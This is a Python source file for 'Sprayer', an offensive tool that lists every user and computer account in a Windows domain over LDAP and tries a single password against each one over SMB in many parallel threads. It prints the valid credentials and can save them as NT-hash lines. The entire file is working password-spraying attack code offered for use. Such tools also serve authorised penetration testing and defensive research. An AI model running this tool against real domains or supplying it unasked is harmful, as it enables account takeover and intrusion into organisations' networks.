#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : Sprayer.py
# Author             : Podalirius (@podalirius_)
# Date created       : 14 Dec 2022

import argparse
from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError
from sectools.windows.ldap import raw_ldap_query
from sectools.windows.crypto import nt_hash, parse_lm_nt_hashes
from concurrent.futures import ThreadPoolExecutor


def try_login(username, password, domain, lmhash, nthash, target, results, port):
    try:
        smbClient = SMBConnection(
            remoteName=target,
            remoteHost=target,
            sess_port=int(port)
        )
        smbClient.login(
            user=username,
            password=password,
            domain=domain,
            lmhash=lmhash,
            nthash=nthash
        )
    except Exception as e:
        return (False, str(e))
    else:
        print("[+] %s\\%s:%s" % (domain, username, password))
        results['%s\\%s' % (domain, username)] = password
        return (True, "success")


def parseArgs():
    print("Sprayer v1.1 - by @podalirius_\n")

    parser = argparse.ArgumentParser(description="Multithreaded spraying of a password on all accounts of a domain")
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='Verbose mode. (default: False)')
    parser.add_argument("-sp", "--spray-password", default=None, required=True, type=str, help='arg1 help message')
    parser.add_argument("-oH", "--output-hashes", default=None, required=False, type=str, help='Output hashes to file')
    parser.add_argument("-T", "--threads", default=16, type=int, help="Number of threads (default: 16)")
    parser.add_argument("-P", "--port", default=445, type=int, help="SMB port to connect to (default: 445)")

    # Credentials
    group_credentials = parser.add_argument_group("Credentials")
    group_credentials.add_argument("-u", "--username", default="", help="Username to authenticate to the remote machine.")
    group_credentials.add_argument("-p", "--password", default="", help="Password to authenticate to the remote machine. (if omitted, it will be asked unless -no-pass is specified)")
    group_credentials.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the machine.")
    group_credentials.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
    group_credentials.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
    group_credentials.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")

    return parser.parse_args()


def main():
    options = parseArgs()
    lmhash, nthash = parse_lm_nt_hashes(options.hashes)

    results = raw_ldap_query(
        auth_domain=options.domain,
        auth_dc_ip=options.dc_ip,
        auth_username=options.username,
        auth_password=options.password,
        auth_hashes=options.hashes,
        query='(|(objectCategory=computer)(objectCategory=user)(objectCategory=person))',
        attributes=['sAMAccountName']
    )
    target_accounts = []
    for cn in results.keys():
        target_accounts.append(results[cn]['sAMAccountName'])

    print("[+] Targeting %d accounts" % (len(target_accounts)))

    # Waits for all the threads to be completed
    with ThreadPoolExecutor(max_workers=min(options.threads, len(target_accounts))) as tp:
        results = {}
        for username in target_accounts:
            tp.submit(try_login, username, options.spray_password, options.domain, lmhash, nthash, options.dc_ip, results, options.port)

    if options.output_hashes:
        f = open(options.output_hashes, 'w')
        for username, password in results.items():
            f.write("%s:aad3b435b51404eeaad3b435b51404ee:%s:%s" % (username, nt_hash(password), password))

    print("[+] Bye Bye!")


if __name__ == '__main__':
    main()
